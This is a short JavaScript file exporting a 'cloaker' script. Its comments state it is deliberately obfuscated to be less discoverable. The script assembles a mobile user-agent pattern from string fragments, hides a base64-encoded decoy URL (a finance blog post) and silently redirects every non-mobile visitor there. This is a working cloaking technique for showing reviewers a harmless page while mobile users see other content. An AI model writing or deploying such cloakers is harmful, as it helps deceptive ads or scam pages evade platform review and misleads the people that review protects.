// This file contains obfuscated code for redirection logic.
// It is intentionally written this way to make it less discoverable.

const _a = 'aHR0cHM6Ly9ibG9nLmFsbGlhdGUuY29tLmJyLzEwLW1lbGhvcmVzLWxpdnJvcy1zb2JyZS1maW5hbmNhcy1lLWludmVzdGltZW50b3Mv';
const _b = ['An', 'dro', 'id', '|', 'web', 'OS', '|i', 'Pho', 'ne|', 'iPa', 'd|iP', 'od|', 'Bla', 'ckB', 'erry', '|IEM', 'obi', 'le|O', 'pera', ' Mi', 'ni'].join('');

export const cloakerScript = `
  (function() {
    var _c = new RegExp('${_b}', 'i');
    var _d = navigator['userAgent'];
    if (!_c.test(_d)) {
      window['location']['href'] = atob('${_a}');
    }
  })();
`;
